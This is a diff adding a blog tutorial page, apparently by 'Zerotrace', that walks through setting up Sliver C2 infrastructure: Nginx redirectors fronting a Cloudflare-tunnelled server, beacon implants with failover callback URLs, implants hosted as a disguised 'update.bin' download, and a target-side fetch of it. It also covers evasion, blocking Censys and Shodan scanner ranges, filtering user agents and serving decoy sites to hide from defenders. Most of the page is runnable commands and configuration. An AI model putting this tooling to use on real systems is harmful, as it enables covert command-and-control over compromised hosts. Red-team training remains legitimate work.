+        # Disable SSL verification (Cloudflare handles it)
+        proxy_ssl_verify off;
+    }
+
+    # Health check endpoint
+    location /health {
+        access_log off;
+        return 200 "OK\n";
+        add_header Content-Type text/plain;
+    }
+
+    # Decoy site - root path
+    location / {
+        root /var/www/decoy;
+        index index.html;
+    }
+}</code></pre>
+    </div>
+  </div>
+  <!-- END: Collapsible Nginx configuration -->
+
+  <pre><code># Enable configuration and reload Nginx
+sudo ln -s /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default  # Remove default site
+sudo nginx -t  # Test configuration
+sudo systemctl reload nginx</code></pre>
+
+  <h3><span class="step">[Step 11]</span> Test Redirector</h3>
+
+  <pre><code># Test health check
+curl -I https://r1.example.com/health
+# Expected: HTTP/2 200
+
+# Test decoy site
+curl https://r1.example.com/
+# Expected: HTML content
+
+# Test API proxy (C2 not running yet)
+curl -I https://r1.example.com/api/
+# Expected: HTTP/2 502 Bad Gateway (normal, C2 not running)
+
+# Test downloads (no files yet)
+curl -I https://r1.example.com/downloads/test.bin
+# Expected: HTTP/2 404 Not Found (normal, no files uploaded)</code></pre>
+
+  <h3><span class="step">[Step 12]</span> Monitor Logs</h3>
+
+  <pre><code># Watch access logs
+sudo tail -f /var/log/nginx/redirector_access.log
+
+# Watch error logs
+sudo tail -f /var/log/nginx/redirector_error.log</code></pre>
+
+  <h2 id="phase-4">Phase 4: Sliver C2 Configuration</h2>
+
+  <h3><span class="step">[Step 1]</span> Install Sliver</h3>
+
+  <p><strong>On Kali Linux</strong> (Sliver pre-installed):</p>
+  <pre><code># Sliver should be available
+which sliver-server</code></pre>
+
+  <p><strong>On Ubuntu/Debian:</strong></p>
+  <pre><code># Download latest release
+curl https://sliver.sh/install | sudo bash
+
+# Or manual installation
+wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
+sudo mv sliver-server_linux /usr/local/bin/sliver-server
+sudo chmod +x /usr/local/bin/sliver-server</code></pre>
+
+  <div class="note">
+    <strong>For detailed Sliver installation:</strong> See my comprehensive guide at <a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a>
+  </div>
+
+  <h2 id="phase-5">Phase 5: Beacon Generation & Deployment</h2>
+
+  <h3><span class="step">[Step 1]</span> Generate Beacon with Failover</h3>
+
+  <p><strong>In Sliver console:</strong></p>
+  <pre><code>sliver &gt; generate beacon \
+  --http https://r1.example.com/api,https://r2.example.com/api \
+  --os linux \
+  --arch amd64 \
+  --format elf \
+  --save /tmp/linux_beacon</code></pre>
+
+  <p><strong>Parameters:</strong></p>
+  <ul>
+    <li><code>--http</code>: Callback URLs (comma-separated for failover)</li>
+    <li><code>--os</code>: Target operating system (linux, windows, darwin)</li>
+    <li><code>--arch</code>: Target architecture (amd64, arm64, arm, 386)</li>
+    <li><code>--format</code>: Output format (elf, exe, shellcode, shared, service)</li>
+    <li><code>--save</code>: Output path</li>
+  </ul>
+
+  <p><strong>Output:</strong></p>
+  <pre><code>[*] Generating new linux/amd64 beacon implant binary (5m0s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 3s
+[*] Implant saved to /tmp/linux_beacon</code></pre>
+
+  <h3><span class="step">[Step 2]</span> Verify Beacon Binary</h3>
+
+  <pre><code>file /tmp/linux_beacon
+# Expected: ELF 64-bit LSB executable, x86-64 (for amd64)
+
+ls -lh /tmp/linux_beacon
+# Check size (typically 8-15 MB)</code></pre>
+
+  <h3><span class="step">[Step 3]</span> Deploy Beacon to Redirector</h3>
+
+  <pre><code># Copy to redirector
+scp /tmp/linux_beacon operator@r1.example.com:/tmp/
+
+# SSH to redirector and move to implants directory
+ssh operator@r1.example.com
+sudo mv /tmp/linux_beacon /var/www/implants/update.bin
+sudo chown www-data:www-data /var/www/implants/update.bin
+sudo chmod 644 /var/www/implants/update.bin
+
+# Verify
+ls -la /var/www/implants/
+# Should show: -rw-r--r-- 1 www-data www-data &lt;size&gt; update.bin</code></pre>
+
+  <div class="note">
+    <strong>Why these permissions:</strong><br>
+    <code>chown www-data:www-data</code>: Nginx runs as www-data user, needs ownership to read files<br>
+    <code>chmod 644</code>: Owner (www-data) can read/write, everyone else can only read. File is NOT executable by web server for security.
+  </div>
+
+  <h3><span class="step">[Step 4]</span> Test Implant Download</h3>
+
+  <pre><code># From local machine - test download
+curl -I https://r1.example.com/downloads/update.bin
+# Expected response:
+# HTTP/2 200
+# content-type: application/octet-stream
+# content-disposition: attachment
+# content-length: &lt;size&gt;
+
+# Download and verify integrity
+curl -o /tmp/test_beacon https://r1.example.com/downloads/update.bin
+file /tmp/test_beacon
+md5sum /tmp/test_beacon
+md5sum /tmp/linux_beacon
+# MD5 sums should match</code></pre>
+
+  <h3><span class="step">[Step 5]</span> Execute Beacon on Test System</h3>
+
+  <p><strong>On target Linux system:</strong></p>
+  <pre><code># Download beacon
+curl -o /tmp/update https://r1.example.com/downloads/update.bin</code></pre>
+
+  <h3><span class="step">[Step 6]</span> Verify Beacon Callback</h3>
+
+  <p><strong>In Sliver console:</strong></p>
+  <pre><code>sliver &gt; beacons</code></pre>
+
+  <p><strong>Expected output (after beacon interval + jitter):</strong></p>
+  <pre><code> ID        Name             Transport  Remote Address       Hostname  Username  Operating System  Last Check-In
+========  ===============  =========  ===================  ========  ========  ================  =============
+ abc12345  SIMPLE_KOALA     https      203.0.113.10:443     testbox   user      linux/amd64       2m30s</code></pre>
+
+  <div class="note">
+    <strong>If beacon appears, SUCCESS!</strong> The entire chain is working:<br>
+    Test System → r1.example.com/api/ → Nginx → c2.example.com → Cloudflare Tunnel → Sliver C2
+  </div>
+
+  <h3><span class="step">[Step 7]</span> Test Failover</h3>
+
+  <pre><code># Stop r1 redirector
+ssh operator@r1.example.com
+sudo systemctl stop nginx
+
+# Wait for next beacon check-in (up to 5 minutes + jitter)
+# In Sliver console:
+sliver &gt; beacons
+# Beacon should still check in via r2.example.com
+# Beacon will automatically try r2 when r1 fails - no manual intervention needed
+
+# Restart r1
+sudo systemctl start nginx</code></pre>
+
+  <h2 id="phase-6">Phase 6: Second Redirector Setup</h2>
+
+  <h3><span class="step">[Step 1]</span> Create Snapshot of r1</h3>
+
+  <p><strong>Power off r1 droplet</strong> (DigitalOcean dashboard):</p>
+  <ol>
+    <li>Go to <strong>Droplets</strong></li>
+    <li>Click on <code>redirector-r1</code></li>
+    <li>Click <strong>Power</strong> → <strong>Power Off</strong></li>
+    <li>Wait for status: "Off"</li>
+  </ol>
+
+  <p><strong>Create snapshot:</strong></p>
+  <ol>
+    <li>Click <strong>Snapshots</strong> tab</li>
+    <li>Click <strong>Take Snapshot</strong></li>
+    <li>Name: <code>redirector-r1-configured-20250127</code></li>
+    <li>Click <strong>Take Snapshot</strong></li>
+    <li>Wait 2-5 minutes for completion</li>
+  </ol>
+
+  <p><strong>Power r1 back on:</strong></p>
+  <ol>
+    <li>Click <strong>Power</strong> → <strong>Power On</strong></li>
+  </ol>
+
+  <p><strong>Alternative: CLI (doctl)</strong></p>
+  <pre><code># Install doctl
+snap install doctl
+doctl auth init  # Enter API token
+
+# Power off
+doctl compute droplet-action power-off &lt;droplet-id&gt;
+
+# Create snapshot
+doctl compute droplet-action snapshot &lt;droplet-id&gt; \
+  --snapshot-name "redirector-r1-configured-20250127"
+
+# List snapshots
+doctl compute snapshot list --resource droplet
+
+# Power on
+doctl compute droplet-action power-on &lt;droplet-id&gt;</code></pre>
+
+  <h3><span class="step">[Step 2]</span> Deploy r2 from Snapshot</h3>
+
+  <p><strong>DigitalOcean GUI:</strong></p>
+  <ol>
+    <li>Go to <strong>Images</strong> → <strong>Snapshots</strong></li>
+    <li>Find <code>redirector-r1-configured-20250127</code></li>
+    <li>Click <strong>⋮</strong> (three dots) → <strong>Create Droplet</strong></li>
+    <li><strong>Choose Size</strong>: Same as r1 ($6/month, 1GB RAM)</li>
+    <li><strong>Authentication</strong>: SSH keys (pre-selected from snapshot)</li>
+    <li><strong>Hostname</strong>: <code>redirector-r2-active</code></li>
+    <li>Click <strong>Create Droplet</strong></li>
+    <li><strong>Note new IP</strong>: e.g., 203.0.113.20</li>
+  </ol>
+
+  <p><strong>CLI:</strong></p>
+  <pre><code>doctl compute droplet create redirector-r2-active \
+  --image &lt;snapshot-id&gt; \
+  --size s-1vcpu-1gb \
+  --region ams3 \
+  --ssh-keys &lt;key-id&gt;
+
+# Get IP
+doctl compute droplet list</code></pre>
+
+  <h3><span class="step">[Step 3]</span> Update DNS for r2</h3>
+
+  <p>In Cloudflare dashboard:</p>
+  <ol>
+    <li>Go to <strong>DNS</strong> tab</li>
+    <li>Find <code>r2.example.com</code> A record</li>
+    <li>Update IPv4 address to new r2 IP: <code>203.0.113.20</code></li>
+    <li>Ensure <strong>Proxy status</strong>: ☁️ Gray (DNS only)</li>
+    <li>Click <strong>Save</strong></li>
+  </ol>
+
+  <pre><code># Wait for DNS propagation
+nslookup r2.example.com
+# Should return new IP: 203.0.113.20</code></pre>
+
+  <h3><span class="step">[Step 4]</span> SSH to r2</h3>
+
+  <pre><code>ssh operator@r2.example.com
+# or use IP if DNS not propagated yet:
+ssh operator@203.0.113.20</code></pre>
+
+  <h3><span class="step">[Step 5]</span> Customize r2 Configuration</h3>
+
+  <pre><code># Change hostname
+sudo hostnamectl set-hostname redirector-r2
+
+# Update Nginx configuration to use r2.example.com
+sudo sed -i 's/r1\.example\.com/r2.example.com/g' /etc/nginx/sites-available/redirector
+
+# Stop nginx temporarily
+sudo systemctl stop nginx
+
+# Remove old SSL certificate and generate new one
+sudo certbot delete --cert-name r1.example.com
+sudo certbot --nginx -d r2.example.com
+
+# Test and start Nginx
+sudo nginx -t
+sudo systemctl start nginx</code></pre>
+
+  <h3><span class="step">[Step 6]</span> Deploy Implants to r2</h3>
+
+  <pre><code># Copy beacon from r1 or regenerate
+scp /tmp/linux_beacon operator@r2.example.com:/tmp/
+ssh operator@r2.example.com
+sudo mv /tmp/linux_beacon /var/www/implants/update.bin
+sudo chown www-data:www-data /var/www/implants/update.bin
+sudo chmod 644 /var/www/implants/update.bin</code></pre>
+
+  <h3><span class="step">[Step 7]</span> Test r2 Redirector</h3>
+
+  <pre><code># Test all endpoints
+curl -I https://r2.example.com/health
+# Expected: HTTP/2 200
+
+curl -I https://r2.example.com/downloads/update.bin
+# Expected: HTTP/2 200
+
+curl -I https://r2.example.com/api/
+# Expected: HTTP/2 404 (Sliver responding)</code></pre>
+
+  <h2 id="troubleshooting">Troubleshooting</h2>
+
+  <h3>Implant Not Downloading (404 Error)</h3>
+
+  <pre><code># Symptom
+curl -I https://r1.example.com/downloads/update.bin
+# HTTP/2 404 Not Found
+
+# Diagnosis - check if file exists
+ssh operator@r1.example.com
+ls -la /var/www/implants/</code></pre>
+
+  <p><strong>Common fixes:</strong></p>
+  <ul>
+    <li>File doesn't exist: Upload beacon to <code>/var/www/implants/</code></li>
+    <li>Wrong filename: Nginx serves exact filename (case-sensitive)</li>
+    <li>Check nginx config: <code>location /downloads/</code> should alias to <code>/var/www/implants/</code></li>
+  </ul>
+
+  <h3>Implant Not Downloading (403 Forbidden)</h3>
+
+  <pre><code># Symptom
+curl -I https://r1.example.com/downloads/update.bin
+# HTTP/2 403 Forbidden
+
+# Diagnosis - check permissions
+ls -la /var/www/implants/update.bin
+
+# Fix permissions
+sudo chown www-data:www-data /var/www/implants/update.bin
+sudo chmod 644 /var/www/implants/update.bin</code></pre>
+
+  <h3>Nginx Can't Reach C2</h3>
+
+  <pre><code># Test from redirector
+curl -I https://c2.example.com
+# If fails, DNS issue or Cloudflare tunnel problem</code></pre>
+
+  <h2 id="security-considerations">Security Considerations</h2>
+
+  <h3>Scanner IP Blocking</h3>
+
+  <p>Nginx configured to return 404 for known scanner IP ranges:</p>
+
+  <pre><code># Censys ranges
+167.94.138.0/24
+167.94.145.0/24
+167.248.133.0/24
+
+# Shodan ranges
+71.6.135.0/24
+71.6.146.0/24
+71.6.167.0/24
+66.240.192.0/24
+66.240.219.0/24</code></pre>
+
+  <div class="note">
+    <strong>Update list periodically</strong> - scanners change IP ranges.
+  </div>
+
+  <h3>User-Agent Filtering</h3>
+
+  <p><strong>Optional</strong> - add to nginx config to block non-browser requests:</p>
+
+  <pre><code>if ($http_user_agent !~* "Mozilla/5.0") {
+    return 404;
+}</code></pre>
+
+  <p><strong>Trade-off:</strong> Blocks some legitimate tools (curl, wget) but also blocks automated scanners.</p>
+
+  <h3>Indicators of Compromise (IOCs)</h3>
+
+  <p><strong>What defenders might detect:</strong></p>
+
+  <ol>
+    <li><strong>Network:</strong>
+      <ul>
+        <li>Outbound HTTPS to unknown domain (r1.example.com)</li>
+        <li>Long-lived HTTPS connections</li>
+        <li>Regular beaconing patterns (mitigate with jitter)</li>
+      </ul>
+    </li>
+    <li><strong>Endpoint:</strong>
+      <ul>
+        <li>Unsigned binary execution</li>
+        <li>Memory allocation patterns (RWX pages)</li>
+        <li>Process injection indicators</li>
+      </ul>
+    </li>
+    <li><strong>Infrastructure:</strong>
+      <ul>
+        <li>WHOIS lookup of domain (use privacy protection)</li>
+        <li>Reverse DNS of redirector IP</li>
+        <li>TLS certificate transparency logs</li>
+      </ul>
+    </li>
+  </ol>
+
+  <p><strong>Mitigation:</strong></p>
+  <ul>
+    <li>Domain categorization (legitimate business category)</li>
+    <li>Valid TLS certificates (Let's Encrypt)</li>
+    <li>Decoy website content</li>
+    <li>Traffic randomization (jitter, intervals)</li>
+    <li>Consider domain fronting (advanced, beyond scope)</li>
+  </ul>
+
+  <h2>Conclusion</h2>
+
+  <p>You now have a professional C2 infrastructure with:</p>
+
+  <ul>
+    <li><strong>Stealth</strong>: Home lab hidden behind Cloudflare Tunnel, zero public exposure</li>
+    <li><strong>Flexibility</strong>: Rotate redirectors in minutes without touching C2</li>
+    <li><strong>Cost Efficiency</strong>: Snapshot-based deployment (~$2/month when idle)</li>
+    <li><strong>Scalability</strong>: Add more redirectors as needed</li>
+  </ul>
+
+  <h3>Next Steps</h3>
+  <ol>
+    <li>Practice deploying/destroying redirectors from snapshots</li>
+    <li>Test failover scenarios (stop r1, verify r2 takes over)</li>
+    <li>Experiment with beacon configurations</li>
+    <li>Develop custom stagers for different platforms</li>
+    <li>Implement monitoring and alerting (optional)</li>
+  </ol>
+
+  <div class="disclaimer">
+    <strong>Remember:</strong> This infrastructure is a tool. Use it responsibly, legally, and ethically.
+  </div>
+
+  <h2>Additional Resources</h2>
+
+  <h3>Sliver Documentation</h3>
+  <ul>
+    <li><a href="https://sliver.sh/docs" target="_blank" rel="noopener">Official docs: sliver.sh/docs</a></li>
+    <li><a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener">GitHub: github.com/BishopFox/sliver</a></li>
+    <li><a href="https://github.com/BishopFox/sliver/wiki" target="_blank" rel="noopener">Wiki: github.com/BishopFox/sliver/wiki</a></li>
+  </ul>
+
+  <h3>Cloudflare Tunnel</h3>
+  <ul>
+    <li><a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/" target="_blank" rel="noopener">Documentation</a></li>
+    <li><a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/tunnel-guide/" target="_blank" rel="noopener">Setup guide</a></li>
+  </ul>
+
+  <h3>DigitalOcean</h3>
+  <ul>
+    <li><a href="https://docs.digitalocean.com/products/droplets/" target="_blank" rel="noopener">Droplet docs</a></li>
+    <li><a href="https://docs.digitalocean.com/products/images/snapshots/" target="_blank" rel="noopener">Snapshots guide</a></li>
+    <li><a href="https://docs.digitalocean.com/reference/doctl/" target="_blank" rel="noopener">doctl CLI</a></li>
+  </ul>
+
+  <h3>Nginx</h3>
+  <ul>
+    <li><a href="https://nginx.org/en/docs/" target="_blank" rel="noopener">Official docs</a></li>
+    <li><a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/" target="_blank" rel="noopener">Reverse proxy guide</a></li>
+  </ul>
+
+  <h3>Let's Encrypt / Certbot</h3>
+  <ul>
+    <li><a href="https://letsencrypt.org/getting-started/" target="_blank" rel="noopener">Getting started</a></li>
+    <li><a href="https://eff-certbot.readthedocs.io/" target="_blank" rel="noopener">Certbot docs</a></li>
+  </ul>
+
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/zerotrace/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+<script>
+  // Collapsible code block toggle functionality
+  document.addEventListener('DOMContentLoaded', function() {
+    const toggleBtn = document.querySelector('.code-toggle-btn');
+    const codeBlock = document.getElementById('nginx-config-block');
+
+    if (toggleBtn && codeBlock) {
+      toggleBtn.addEventListener('click', function() {
+        const isExpanded = this.getAttribute('aria-expanded') === 'true';
+
+        if (isExpanded) {
+          // Collapse
+          codeBlock.style.display = 'none';
+          this.setAttribute('aria-expanded', 'false');
+          this.querySelector('.toggle-icon').textContent = '▶';
+          this.querySelector('.toggle-label').textContent = 'Show Nginx configuration';
+        } else {
+          // Expand
+          codeBlock.style.display = 'block';
+          this.setAttribute('aria-expanded', 'true');
+          this.querySelector('.toggle-icon').textContent = '▼';
+          this.querySelector('.toggle-label').textContent = 'Hide Nginx configuration';
+        }
+      });
+
+      // Keyboard support (Enter or Space)
+      toggleBtn.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          this.click();
+        }
+      });
+    }
+  });
+</script>
+</body>
+</html>
